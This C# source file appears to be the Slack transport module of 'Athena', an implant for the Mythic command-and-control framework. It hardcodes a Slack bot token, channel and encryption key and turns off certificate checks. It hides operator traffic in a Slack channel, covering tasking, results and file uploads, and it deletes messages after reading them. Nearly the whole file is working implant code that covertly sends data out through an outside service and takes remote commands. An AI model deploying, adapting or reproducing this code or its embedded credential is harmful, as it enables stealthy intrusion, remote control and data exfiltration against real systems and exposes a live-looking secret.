﻿using Athena.Utilities;
using Newtonsoft.Json;

using System;
using System.Net;
using System.Net.Security;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using Newtonsoft.Json.Linq;

namespace Athena.Config
{
    public class MythicConfig
    {
        public Slack currentConfig { get; set; }
        public static string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public Forwarder forwarder { get; set; }

        public MythicConfig()
        {

            uuid = "ce252fde-4c5f-426a-9825-e7b844ce0f68";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("20", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("10", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.currentConfig = new Slack(uuid);
            this.forwarder = new Forwarder();

        }
    }

    public class Slack
    {
        public bool encrypted { get; set; }
        public PSKCrypto crypt { get; set; }
        public string psk { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        private WebClient webClient = new WebClient();
        private string messageToken { get; set; }
        private string channel { get; set; }
        private string current_message { get; set; }
        private int messageChecks { get; set; } //How many times to attempt to send/read messages before assuming a failure
        private int timeBetweenChecks { get; set; } //How long (in seconds) to wait in between checks
        private string userAgent { get; set; }
        public string proxyHost { get; set; }
        public string proxyPass { get; set; }
        public string proxyUser { get; set; }
        private string agent_guid = Guid.NewGuid().ToString();
        public Slack(string uuid)
        {
            this.psk = "AZ/oea0g4ceOnw/thTmOjuoc2DZbFbauq8QknAm8Y58=";
            this.encryptedExchangeCheck = bool.Parse("false");
            this.messageToken = "xoxb-1699442376370-3485707998774-KF8YMnTBKUHfNAtm2fikr6nZ";
            this.channel = "C03F752RT5E";
            this.userAgent = "test";
            this.messageChecks = int.Parse("10");
            this.timeBetweenChecks = int.Parse("3");
            this.proxyHost = ":";
            this.proxyPass = "";
            this.proxyUser = "";

            //Might need to make this configurable
            ServicePointManager.ServerCertificateValidationCallback =
                   new RemoteCertificateValidationCallback(
                        delegate
                        { return true; }
                    );

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(uuid, this.psk);
                this.encrypted = true;
            }

            this.webClient.Headers.Add("Authorization", $"Bearer {this.messageToken}");

            if (!String.IsNullOrEmpty(this.userAgent))
            {
                this.webClient.Headers.Add("user-agent", this.userAgent);
            }

            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    wp.Credentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                this.webClient.Proxy = wp;
            }
            else
            {
                this.webClient.UseDefaultCredentials = true;
                this.webClient.Proxy = WebRequest.GetSystemWebProxy();
            }


            if (!JoinChannel().Result)
            {
                Environment.Exit(0);
            }
        }
        private async Task<bool> JoinChannel()
        {
            string data = "{\"channel\": \"" + this.channel + "\"}";
            return await SendPost("https://slack.com/api/conversations.join", data);
        }
        public async Task<string> Send(object obj)
        {
            string json;
            try
            {
                json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(MythicConfig.uuid + json);
                }

                int i = 0;


                while (!await SendSlackMessage(json))
                {
                    if (i == this.messageChecks)
                    {
                        current_message = "";
                        return "";
                    }
                    i++;
                }

                Dictionary<string, MythicMessageWrapper> result;
                json = "";
                i = 0;

                //Give the server a second to respond.

                result = await GetSlackMessages();

                //We should only be getting one message back so this is likely unneeded also
                //But just in case I ever need it later, use LINQ to select unique messages from the result in the event we accidentally receive double messages.
                //Still not right, if we send a command and a task result this is still valid but still fucks up the json
                //Probably just going to take the first item
                //foreach (var message in result.Reverse().FirstOrDefault())
                //{
                //    json += message.Value.message;
                //}


                //Take only the most recent response in case some messages got left over.
                //This may cause issues in the event I need to implement slack message chunking, but with current max values it should be fine.
                if (result.FirstOrDefault().Value is not null)
                {
                    json = result.FirstOrDefault().Value.message;
                }
                else
                {
                    current_message = "";
                    return "";
                }

                //Delete the messages we've read successfully and indicate we're not waiting for a response anymore
                DeleteMessages(result.Keys.ToList<string>());

                //Indicate we're done with the current message
                current_message = "";

                if (this.encrypted)
                {
                    return this.crypt.Decrypt(json);
                }
                else
                {
                    if (String.IsNullOrEmpty(json))
                    {
                        return json;
                    }
                    else
                    {
                        return (await Misc.Base64Decode(json)).Substring(36);
                    }
                }
            }
            catch (Exception e)
            {
                return "";
            }
        }
        private async Task<bool> SendSlackMessage(string data)
        {
            string url = "https://slack.com/api/chat.postMessage";

            MythicMessageWrapper msg;
            if (data.Count() > 3850)
            {
                msg = new MythicMessageWrapper()
                {
                    sender_id = this.agent_guid,
                    message = "",
                    to_server = true,
                    id = 1,
                    final = true
                };
                return await UploadSlackFile(data, msg);
            }
            else
            {
                msg = new MythicMessageWrapper()
                {
                    sender_id = this.agent_guid,
                    message = data,
                    to_server = true,
                    id = 1,
                    final = true
                };

                SendMessage sm = new SendMessage()
                {
                    channel = this.channel,
                    text = JsonConvert.SerializeObject(msg),
                    username = "Server",
                    icon_emoji = ":crown:"
                };

                try
                {
                    return await SendPost(url, JsonConvert.SerializeObject(sm));
                }
                catch (Exception e)
                {
                    return false;
                }

            }
        }
        private async Task<bool> UploadSlackFile(string data, MythicMessageWrapper mw)
        {
            string url = "https://slack.com/api/files.upload";
            //Wait for webclient to become available
            while (this.webClient.IsBusy) ; ;

            //Add file parameters, will probably need to change these
            var parameters = new NameValueCollection();
            parameters.Add("filename", "file");
            parameters.Add("filetype", "text");
            parameters.Add("channels", this.channel);
            parameters.Add("title", "file");
            parameters.Add("initial_comment", JsonConvert.SerializeObject(mw));
            parameters.Add("content", data);

            try
            {
                byte[] res = this.webClient.UploadValues(url, "POST", parameters);

                //Another try/catch because this might fail, but doesn't necessarily indicate a failed upload.
                try
                {
                    string strRes = System.Text.Encoding.UTF8.GetString(res);
                    FileUploadResponse fur = JsonConvert.DeserializeObject<FileUploadResponse>(strRes);

                    //Indicate that a file has been marked for uploading.
                    current_message = fur.file.timestamp.ToString();
                }
                catch (Exception e)
                {
                    return true;
                }
                return true;
            }
            catch (WebException e)
            {;
                HttpWebResponse webRes = (HttpWebResponse)e.Response;
                if (webRes.StatusCode == HttpStatusCode.TooManyRequests)
                {
                    try
                    {
                        await Task.Delay(int.Parse(webRes.Headers["Retry-After"]));
                    }
                    catch (Exception ex)
                    {
                        await Task.Delay(this.timeBetweenChecks * 1000);
                    }
                    return false;
                }
                return false;
            }
        }
        private async Task<bool> DeleteMessages(List<string> messages)
        {
            // This works for the current implemenation but may have to change in the event I need to further chunk messages.
            bool success = false;
            foreach(var message in messages)
            {
                string data = "{\"channel\":\"" + this.channel + "\",\"ts\":\"" + message + "\"}";
                success = await SendPost("https://slack.com/api/chat.delete", data);
            }


            return success;
        }
        private async Task<Dictionary<string, MythicMessageWrapper>> GetSlackMessages()
        {
            Dictionary<string, MythicMessageWrapper> messages = new Dictionary<string, MythicMessageWrapper>();
            string res = "";
            ConversationHistoryResponse msgResponse;

            for (int i = 0; i < this.messageChecks; i++) //Keep submitting web request until it works or we hit our max checks
            {
                await Task.Delay(this.timeBetweenChecks * 1000); //Do a delay between each check
                try
                {
                    res = await SendGet($"https://slack.com/api/conversations.history?channel={this.channel}&limit=200");
                    JObject o = JObject.Parse(res);

                    if (!(bool)o["ok"])
                    {
                        if ((string)o["error"] == "account_inactive")
                        {
                            Environment.Exit(0);
                        }
                        continue;
                    }

                    msgResponse = JsonConvert.DeserializeObject<ConversationHistoryResponse>(res);

                    if (msgResponse is not null && msgResponse.messages is not null) //Try Again
                    {
                        foreach (var message in msgResponse.messages)
                        {
                            try
                            {
                                if (message.text.Contains(this.agent_guid))
                                {
                                    MythicMessageWrapper mythicMessage = JsonConvert.DeserializeObject<MythicMessageWrapper>(message.text);

                                    if (!mythicMessage.to_server && mythicMessage.sender_id == this.agent_guid)
                                    {
                                        if (String.IsNullOrEmpty(mythicMessage.message))
                                        {
                                            mythicMessage.message = await SendGet(message.files.FirstOrDefault().url_private);
                                        }
                                        messages.Add(message.ts, mythicMessage);
                                    }
                                }
                            }
                            catch (Exception e)
                            {
\                           }
                        }

                        if (messages.Count < 1)
                        {
                            await Task.Delay(this.timeBetweenChecks * 1000);
                            continue;
                        }
                        else
                        {
                            break;
                        }
                    }
                    else //Message response parse is null
                    {
                        continue;
                    }

                    if (messages.Count < 1) //Server hasn't responded yet
                    {
                        continue;
                    }
                    else //Got some messages for us!
                    {
                        break;
                    }
                }
                catch (Exception e)
                {
                    continue;
                }
            }
            return messages;
        }
        private async Task<bool> SendPost(string url, string data)
        {
            this.webClient.Headers[HttpRequestHeader.ContentType] = "application/json; charset=utf-8";
            while (this.webClient.IsBusy) ; ;
            //POST Slack Message
            try
            {
                string response = this.webClient.UploadString(url, data);

                //I may have to expand upon this check.
                return true;

            }
            catch (WebException e)
            {
                HttpWebResponse webRes = (HttpWebResponse)e.Response;
                if (webRes is not null)
                {
                    if (webRes.StatusCode == HttpStatusCode.TooManyRequests)
                    {
                        try
                        {
                            await Task.Delay(int.Parse(webRes.Headers["Retry-After"]));
                        }
                        catch (Exception ex)
                        {
                            //Default wait 10s
                            await Task.Delay(this.timeBetweenChecks * 1000);
                        }
                    }
                }
                return false;
            }
            catch (Exception ex)
            {
                return false;
            }
        }
        private async Task<string> SendGet(string url)
        {
            if (String.IsNullOrEmpty(this.webClient.Headers["Authorization"]))
            {
                this.webClient.Headers.Add("Authorization", $"Bearer {this.messageToken}");
            }

            try
            {
                return this.webClient.DownloadString(url) ?? "";
            }
            catch (WebException e)
            {
                HttpWebResponse webRes = (HttpWebResponse)e.Response;
                if (webRes is not null)
                {
                    if (webRes.StatusCode == HttpStatusCode.TooManyRequests)
                    {
                        try
                        {
                            await Task.Delay(int.Parse(webRes.Headers["Retry-After"]));
                        }
                        catch (Exception ex)
                        {
                            //Default wait 10s
                            await Task.Delay(10000);
                        }
                        return "";
                    }
                }
                return "";
            }
            catch (Exception ex)
            {
                return "";
            }

        }
        private async Task<bool> GetReactions(string timestamp)
        {
            string res = await this.SendGet($"https://slack.com/api/reactions.get?timestamp={timestamp}&channel={this.channel}");

            ReactionResponseMessage rr = JsonConvert.DeserializeObject<ReactionResponseMessage>(res);

            if (rr.ok)
            {
                if (rr.message.reactions.Count > 0 && rr.message.reactions.Any(x => x.name == "eyes"))
                {
                    return true; //Message has been indicated as processed
                }
                else
                {
                    return false; //Message is not processed
                }
            }
            else //Message doesn't exist which means it's been processed fully.
            {
                return true;
            }
        }
    }

    public class MythicMessageWrapper
    {
        public string message { get; set; } = String.Empty;
        public string sender_id { get; set; } //Who sent the message
        public bool to_server { get; set; }
        public int id { get; set; }
        public bool final { get; set; }
    }
    public class SendMessage
    {
        public string token { get; set; }
        public string channel { get; set; }
        public string text { get; set; }
        public string username { get; set; }
        public string icon_url { get; set; }
        public string icon_emoji { get; set; }
    }
    public class SlackMessage
    {
        public string type { get; set; }
        public string text { get; set; }
        public List<SlackFile> files { get; set; }
        public bool upload { get; set; }
        public string user { get; set; }
        public bool display_as_bot { get; set; }
        public string ts { get; set; }
        public string subtype { get; set; }
        public string username { get; set; }
        public string bot_id { get; set; }
        public string app_id { get; set; }
    }
    public class ResponseMetadata
    {
        public string next_cursor { get; set; }
    }
    public class ConversationHistoryResponse
    {
        public bool ok { get; set; }
        public List<SlackMessage> messages { get; set; }
        public bool has_more { get; set; }
        public int pin_count { get; set; }
        public ResponseMetadata response_metadata { get; set; }
    }
    public class SlackFile
    {
        public string id { get; set; }
        public int created { get; set; }
        public int timestamp { get; set; }
        public string name { get; set; }
        public string title { get; set; }
        public string mimetype { get; set; }
        public string filetype { get; set; }
        public string pretty_type { get; set; }
        public string user { get; set; }
        public bool editable { get; set; }
        public int size { get; set; }
        public string mode { get; set; }
        public bool is_external { get; set; }
        public string external_type { get; set; }
        public bool is_public { get; set; }
        public bool public_url_shared { get; set; }
        public bool display_as_bot { get; set; }
        public string username { get; set; }
        public string url_private { get; set; }
        public string url_private_download { get; set; }
        public string media_display_type { get; set; }
        public string permalink { get; set; }
        public string permalink_public { get; set; }
        public bool is_starred { get; set; }
        public bool has_rich_preview { get; set; }
    }
    public class ReactionMessage
    {
        public string client_msg_id { get; set; }
        public string type { get; set; }
        public string text { get; set; }
        public string user { get; set; }
        public string ts { get; set; }
        public string team { get; set; }
        public List<Block> blocks { get; set; }
        public List<Reaction> reactions { get; set; }
        public string permalink { get; set; }
    }
    public class Reaction
    {
        public string name { get; set; }
        public List<string> users { get; set; }
        public int count { get; set; }
    }
    public class ReactionResponseMessage
    {
        public bool ok { get; set; }
        public string type { get; set; }
        public ReactionMessage message { get; set; }
        public string channel { get; set; }
    }
    public class Block
    {
        public string type { get; set; }
        public string block_id { get; set; }
        public List<Element> elements { get; set; }
    }
    public class Element
    {
        public string type { get; set; }
        public List<Element> elements { get; set; }
        public string text { get; set; }
    }
    public class FileUploadFile
    {
        public int timestamp { get; set; }
    }
    public class FileUploadResponse
    {
        public bool ok { get; set; }
        public FileUploadFile file { get; set; }
    }
}

